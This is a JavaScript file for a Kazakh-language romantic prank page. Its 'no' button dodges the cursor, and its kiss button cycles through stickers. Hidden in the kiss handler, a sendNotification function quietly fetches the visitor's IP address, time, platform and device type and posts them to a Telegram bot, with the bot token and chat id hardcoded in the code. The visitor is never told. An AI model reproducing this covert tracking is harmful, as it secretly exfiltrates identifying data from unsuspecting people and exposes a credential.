// 1. АУЫСАТЫН СТИКЕРЛЕР МЕН МӘТІНДЕР ТІЗІМІ
const kissSteps = [
    { 
        img: "https://media.tenor.com/VcR7PqtHqkkAAAA1/besos.webp", 
        text: "Тағы да сүйші! 😘" 
    },
    { 
        img: "https://media.tenor.com/8PoO4kc08gAAAAAm/dudu-kiss-dudu-kiss-hand.webp", 
        text: "Қандай тәтті... ✨" 
    },
    { 
        img: "https://media.tenor.com/TReOhQcXVuEAAAAm/kiss.webp", 
        text: "Тоқтама, ұнап жатыр! ❤️" 
    },
    { 
        img: "https://media.tenor.com/cCJohJfASEwAAAA1/h.webp", 
        text: "Сені қатты жақсы көрем! 🥰" 
    }
];

let kissIndex = 0;

const noBtn = document.getElementById('noBtn');
const yesBtn = document.getElementById('yesBtn');
const sticker = document.getElementById('mainSticker');
const title = document.getElementById('title');
const container = document.querySelector('.button-container');

// 2. ЖОҚ БАТЫРМАСЫ ҚАШАДЫ
noBtn.addEventListener('mouseover', () => {
    noBtn.style.position = 'fixed';
    const maxX = window.innerWidth - noBtn.offsetWidth - 20;
    const maxY = window.innerHeight - noBtn.offsetHeight - 20;
    const randomX = Math.floor(Math.random() * maxX);
    const randomY = Math.floor(Math.random() * maxY);
    noBtn.style.left = randomX + 'px';
    noBtn.style.top = randomY + 'px';
});

// 3. ИӘ БАСЫЛҒАНДА: СҮЮ БАТЫРМАСЫНА ӨТУ
yesBtn.addEventListener('click', () => {
    sticker.src = "https://media.tenor.com/r0VCmLiA3mEAAAAm/sseeyall-bubu-dudu.webp";
    title.innerText = "мен де жақсы көрем! 🥰";
    
    container.innerHTML = `
        <button id="kissBtn" style="background-color: #fd79a8; color: white; padding: 20px 40px; font-size: 22px; cursor: pointer; border-radius: 12px; border: none;">
             сүю 💋
        </button>
    `;

    const kissBtn = document.getElementById('kissBtn');
    
    kissBtn.addEventListener('click', () => {
        createKissEffect(); // Анимация
        sendNotification(); // Хабарлама жіберу

        sticker.src = kissSteps[kissIndex].img;
        title.innerText = kissSteps[kissIndex].text;

        kissIndex++;
        if (kissIndex >= kissSteps.length) {
            kissIndex = 0;
        }
    });
});

// 4. ТЕЛЕГРАМҒА ТОЛЫҚ МӘЛІМЕТ ЖІБЕРУ (Уақыт пен Құрылғы)
async function sendNotification() {
    const token = "8632015616:AAFSbYJClMyktInbsI5rDZekv1ezC-sQ5ik";
    const chat_id = "8130655129";
    
    let ipAddress = "Анықталмады";

    // 1. IP мекенжайын анықтау
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;
    } catch (e) {
        console.error("IP анықтау мүмкін болмады");
    }

    // 2. Мәліметтерді жинау
    const time = new Date().toLocaleString('kk-KZ'); 
    const platform = navigator.platform; 
    const userAgent = navigator.userAgent;

    // Қарапайым тілмен құрылғыны анықтау
    let deviceType = "Компьютер";
    if (/Android/i.test(userAgent)) deviceType = "Android";
    else if (/iPhone|iPad/i.test(userAgent)) deviceType = "iPhone/iPad";

    const message = `
🔔 **ЖАҢА СҮЮ!** 💋
📅 **Уақыты:** ${time}
🌐 **IP мекенжайы:** ${ipAddress}
📱 **Құрылғы:** ${deviceType} (${platform})
🔢 **Стикер нөмірі:** ${kissIndex + 1}
    `;

    // 3. Telegram-ға POST сұраныс жіберу
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chat_id,
            text: message,
            parse_mode: "Markdown" // Мәтінді әдемі (қалың) етіп көрсету үшін
        })
    })
    .then(res => {
        if (res.ok) console.log("СМС IP-мен бірге кетті!");
        else console.log("Қате коды: " + res.status);
    })
    .catch(err => console.error("Жіберу қатесі:", err));
}

// 5. СҮЮ АНИМАЦИЯСЫ
function createKissEffect() {
    const overlay = document.createElement('div');
    overlay.className = 'overlay';
    document.body.appendChild(overlay);
    setTimeout(() => overlay.style.opacity = '1', 10);

    const bigKiss = document.createElement('div');
    bigKiss.className = 'intimate-kiss';
    bigKiss.innerText = '💋';
    document.body.appendChild(bigKiss);
    bigKiss.style.animation = 'heartPulse 1.5s ease-out forwards';

    setTimeout(() => {
        overlay.style.opacity = '0';
        setTimeout(() => {
            overlay.remove();
            bigKiss.remove();
        }, 500);
    }, 1500);
}